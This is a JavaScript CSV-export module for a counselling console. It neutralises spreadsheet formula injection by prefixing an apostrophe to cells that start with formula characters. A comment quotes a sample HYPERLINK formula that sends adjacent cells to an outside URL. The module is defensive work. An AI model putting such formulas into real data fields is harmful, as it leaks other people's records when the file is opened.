// Counsellors keep their own records, so every table can leave as a CSV.

// A cell a spreadsheet would run instead of showing.
//
// Excel, LibreOffice and Sheets treat a cell beginning with = + - @ or a
// leading tab or carriage return as a formula. Two of the columns that leave
// this console are typed by the student: the words they write at check-in, and
// their own name. So a student can put `=HYPERLINK("http://...`&A1)` in a
// check-in, and it sits harmlessly in the app until a counsellor exports the
// table and opens it, at which point it runs on the counsellor's machine with
// the rest of the cohort in the adjacent cells.
//
// Quoting does not help: the quotes are stripped when the file is parsed and
// the formula is what is left. The fix is a leading apostrophe, which every
// spreadsheet reads as "this is text" and does not display.
const FORMULA_START = /^[=+\-@\t\r]/;
// A negative number is not a formula, and prefixing it would turn a real value
// into a string in the counsellor's spreadsheet. Nothing else here starts with
// a minus, so this stays narrow on purpose.
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

function defuse(str) {
  return FORMULA_START.test(str) && !PLAIN_NUMBER.test(str) ? `'${str}` : str;
}

function escapeCell(value) {
  const str = defuse(value === null || value === undefined ? '' : String(value));
  return /[",\n]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
}

export function toCsv(columns, rows) {
  const header = columns.map((c) => escapeCell(c.label)).join(',');
  const body = rows.map((row) => columns.map((c) => escapeCell(c.value(row))).join(','));
  return [header, ...body].join('\n');
}

export function downloadCsv(filename, csv) {
  // \uFEFF so Excel opens the file as UTF-8 instead of mangling names.
  const blob = new Blob([`\uFEFF${csv}`], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}
